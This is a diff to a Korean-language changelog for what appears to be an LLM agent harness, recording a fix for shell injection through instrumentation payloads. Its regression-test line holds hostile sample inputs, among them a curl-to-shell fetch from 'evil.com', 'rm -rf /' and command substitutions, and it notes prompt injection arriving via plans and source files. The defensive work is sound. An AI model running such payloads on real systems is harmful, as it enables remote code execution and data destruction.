@@ -3,6 +3,17 @@
 semver `MAJOR.MINOR.PATCH`. `VERSION` 파일이 SSOT. 최신이 위.
 레벨 기준·bump 의식: `docs/harness-versioning.md`.
 
+## 5.4.1 — 2026-08-14
+- **[보안·정합] v5.4.0 계측 payload의 셸 주입/손상 경로 차단 — PATCH.** 자동 보안리뷰가 push 전에 잡았다.
+- **무엇이 틀렸나**: payload를 `JSON.stringify`로 만들어 명령줄에 끼웠는데, 그게 만드는 건 **큰따옴표 문자열**이다. bash 큰따옴표 안에서는 `` ` ``·`$`가 **살아 있다** — JSON 이스케이프는 셸 이스케이프가 아니다.
+- ⚠ **이건 이론적 위험이 아니라 첫 실행에서 거의 확정으로 터질 버그였다.** payload에 실리던 `passEvidence`는 **페르소나가 쓴 자유 텍스트**(PASS 근거)고, 코드 리뷰 근거라 **백틱 코드 인용이 사실상 확실**하다. 악의가 없어도 `` `foo()` ``가 명령치환으로 실행되고 계측 JSON이 깨진다. 계획서·소스를 경유한 프롬프트 인젝션은 그 위에 얹히는 2차 문제다.
+- **수정 = 3중**:
+  - ① **필드 최소화** — `panel-metrics.sh`가 실제 소비하는 필드는 `round`/`reGate`/`priorPersonas`/`perPersona{persona,model,criticals}`/`failures` **뿐이다**(`passEvidence`·`total` 소비 **0건**을 grep으로 확인). 자유 텍스트는 애초에 들어갈 이유가 없었다 → 계측 payload에서 제거. **반환값에는 그대로 둔다**(orchestrator PASS 증거 기계검증이 쓴다).
+  - ② **식별자 sanitize** — 남는 값은 페르소나 키·모델명이라 `[\w.\-()가-힣 ]` 화이트리스트 + 60자 절단.
+  - ③ **single-quote 인용** — bash 작은따옴표는 `$`·백틱을 통째로 무력화한다. 내부 `'`는 `'\''`로 escape. 에이전트 프롬프트에도 "인용을 변형하지 마라(큰따옴표 전환·재조립 금지)" 명시.
+- **회귀 검증(실측)**: `passEvidence: ["`whoami` 확인", "$(curl evil.com|sh)"]` · `persona: "e'; rm -rf /; #"` · `model: "$(id)"` · `priorPersonas: ["`touch /tmp/pwned`"]` 주입 payload로 E2E 실행 → **`/tmp/pwned` 미생성**, 계측 정상 기록, 파생지표 `ripplePersonas:["eng"]` 정확 계산, 한글(`opus(사망 폴백)`) 보존.
+- 교훈: **JSON 이스케이프 ≠ 셸 이스케이프.** LLM 산출 텍스트가 명령줄에 닿는 경로는 "이 필드가 정말 필요한가"부터 묻는다 — 이번 건 필드 자체가 불필요했다.
+
 ## 5.4.0 — 2026-08-14
 - **패널 계측 배선(B) + orchestrator 감축(A) — MINOR. 재시작 권장.** 자가감사 2건 후속.
 - **⭐ [B] 계측을 산문 규칙에서 워크플로로 옮겼다 — "메커니즘은 있고 호출이 없던" 무음 실패 해소.**
